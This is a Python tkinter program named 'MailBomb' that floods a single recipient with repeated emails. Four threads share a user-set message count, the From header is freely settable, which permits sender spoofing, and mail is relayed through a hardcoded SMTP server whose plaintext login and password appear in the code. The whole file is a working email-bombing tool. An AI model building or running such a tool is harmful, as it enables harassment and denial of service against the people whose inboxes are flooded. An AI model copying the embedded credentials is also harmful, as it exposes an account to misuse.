import tkinter as tk
from tkinter import *
from tkinter.messagebox import showinfo, showwarning, showerror  # 各种类型的提示框
from tkinter import messagebox
from tkinter.scrolledtext import ScrolledText
from email.mime.text import MIMEText
from tkinter import filedialog

import threading

import os
import shutil

import smtplib
import email.mime.multipart
import email.mime.text
import dns.resolver

global dic
dic = {}
threads = []


class App:
    entry1 = None
    entry2 = None
    entry3 = None
    entry4 = None
    text4 = None
    file_path = None
    num = 0
    times = 0

    def show_file(self):
        root = tk.Tk()
        root.withdraw()
        App.file_path = filedialog.askopenfilename()

    def __init__(self, top):
        t1 = threading.Thread(target=self.show_entry_fields)
        threads.append(t1)
        t2 = threading.Thread(target=self.show_entry_fields)
        threads.append(t2)
        t3 = threading.Thread(target=self.show_entry_fields)
        threads.append(t3)
        t4 = threading.Thread(target=self.show_entry_fields)
        threads.append(t4)

        # 放置label和键盘输入框
        text_s = Label(top, text="发件人:").grid(row=0, sticky=W)
        App.entry3 = Entry(top, width=40)  # 实例化一个输入框
        App.entry3.grid(column=0, row=0, sticky=E)

        text1 = Label(top, text="收件人:").grid(row=1, sticky=W)
        App.entry1 = Entry(top, width=40)  # 实例化一个输入框
        App.entry1.grid(column=0, row=1, sticky=E)

        text2 = Label(top, text="邮件发送数目: ").grid(row=2, sticky=W)
        App.entry2 = Entry(top, width=40)  # 实例化一个输入框
        App.entry2.grid(column=0, row=2, sticky=E)
        # self.num=int(App.entry2.get())

        text_sn = Label(top, text="主题:").grid(row=3, sticky=W)
        App.entry4 = Entry(top, width=40)  # 实例化一个输入框
        App.entry4.grid(column=0, row=3, sticky=E)

        # 文本框text组件 实际发送内容
        text3 = Label(top, text="发送内容:").grid(row=10, sticky=W)
        App.text4 = ScrolledText(top, width=46, height=10)
        App.text4.grid(sticky=E)

        # 选择附件
        button1 = Button(top, width=15, text='选择附件', command=self.show_file).grid(row=12, column=0, pady=4)

        # 发送键
        button4 = Button(top, width=15, text='发送', command=self.send).grid(row=15, column=0, pady=4)

    def send(self):
        self.num = int(App.entry2.get())
        if self.times == 0:
            for t in threads:
                t.start()
            self.times = self.times + 1
        # while self.num>0:
        #   print("剩余"+str(self.num)+"封邮件未发送")

        # 监听键盘事件,按确定后

    def show_entry_fields(self):
        if App.file_path is not None:
            # 构造附件1，传送当前目录下的 test.txt 文件
            att1 = MIMEText(open(App.file_path, 'rb').read(), 'base64', 'utf-8')
            att1["Content-Type"] = 'application/octet-stream'
            # 这里的filename可以任意写，写什么名字，邮件中显示什么名字
            filename = App.file_path.split('/')[-1]
            print(filename)
            att1["Content-Disposition"] = 'attachment; filename=' + filename
            print(att1)

        dic['recevier'] = App.entry1.get()
        dic['number'] = App.entry2.get()
        dic['sender'] = App.entry3.get()
        dic['subject'] = App.entry4.get()
        s = App.text4.get("0.0", "end")
        dic['content'] = s.strip()
        print(dic['recevier'])
        print(dic['sender'])
        print(dic['subject'])
        print(dic['number'])
        print(dic['content'])
        # for i in range(int(dic['number'])):
        while 1:
            while self.num > 0:
                self.num = self.num - 1
                msg = email.mime.multipart.MIMEMultipart()
                msg['Subject'] = dic['subject']
                msg['From'] = dic['sender']
                msg['To'] = dic['recevier']
                content = dic['content']
                txt = email.mime.text.MIMEText(content, 'plain', 'utf-8')
                msg.attach(txt)
                if App.file_path is not None:
                    msg.attach(att1)
                try:
                    smtp = smtplib.SMTP()
                    smtp.connect('mail.huliweiba.top', '25')
                    smtp.login('lwq@huliweiba.top', '123456789')
                    smtp.sendmail('lwq@huliweiba.top', [dic['recevier']], msg.as_string())
                    smtp.quit()
                    print('邮件发送成功!')
                    domain = dic['recevier'].split('@')[1]
                    mxs = dns.resolver.query(domain, 'MX')
                    for mx in mxs:
                        print('MX preference =', mx.preference, 'mail exchanger =', mx.exchange)
                except Exception as e:
                    print(e)


# 顶层窗口
top = tk.Tk()
top.geometry('350x350')  # 设置初始化窗口大小
top.title("MailBomb")  # 设置名称
app = App(top)
top.mainloop()
